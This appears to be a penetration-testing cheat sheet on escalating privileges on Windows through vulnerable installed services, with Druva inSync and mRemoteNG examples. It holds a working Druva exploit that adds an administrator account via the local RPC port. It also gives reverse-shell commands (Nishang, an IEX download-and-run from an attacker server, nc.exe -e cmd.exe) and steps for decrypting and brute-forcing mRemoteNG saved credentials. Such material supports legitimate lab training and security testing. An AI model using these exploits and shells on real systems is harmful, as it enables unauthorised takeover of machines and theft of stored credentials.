# Vulnerable Services

### Enumeration

Services are stored in `C:\Program Files (x86)` and `C:\Program Files`

```shellscript
# Enumerate installed programs
wmic product get name

cd C:\Program Files (x86)
cd C:\Program Files

# With powershell 
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

# Enumerate local ports => look for the service port => druva usually runs on 6064 
netstat -ano | grep <PORT>

# Enumerate process ID => found in previous command => should give us the service
get-process -Id <PID>
```

### Example - Druva

```shellscript
# Enumerate installed programs
wmic product get name
Druva inSync 6.6.3

# Enumerate local ports => look for the service port => druva usually runs on 6064 
netstat -ano | grep 6064

# Enumerate process ID => found in previous command => should give us the service
get-process -Id 3324

# Use this PoC code => modify the $cmd
# We can call a reverse shell or add a local admin => Call a shell give SYSTEM privs
# which is better than local admin
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd Hacked@123 /add && net localgroup Administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

# Second options :
# Use this code as a reverse shell. Add the following line at the bottom of it
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443

# Host the script
python3 -m http.server

# Replace the $cmd from the PoC code
$cmd = powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1') 

# Or we can use nc.exe
$cmd = C:\Tools\nc.exe 10.10.14.169 4444 -e cmd.exe
```

### Example - mRemoteNG

```shellscript
# View installed softwares
dir "C:\Program Files"
dir "C:\Program Files (x86)"

# With powershell 
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

# In our example, we see mRemoteNG. mRemoteNG saves connection info and credentials to 
# a file called confCons.xml. They use a hardcoded master password, mR3m, so if anyone 
# starts saving credentials in mRemoteNG and does not protect the configuration with a 
# password, we can access the credentials from the configuration file and decrypt them
cat C:\Users\<USER>\AppData\Roaming\mRemoteNG\confCons.xml

# Decrypt the encrypted password => only works if nobody changed the default pass 
https://github.com/haseebT/mRemoteNG-Decrypt
python3 mremoteng_decrypt.py -s "<PASSWORD_STRING>"

# If we get an error in the previous step, try the following to try differents master pass
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
```
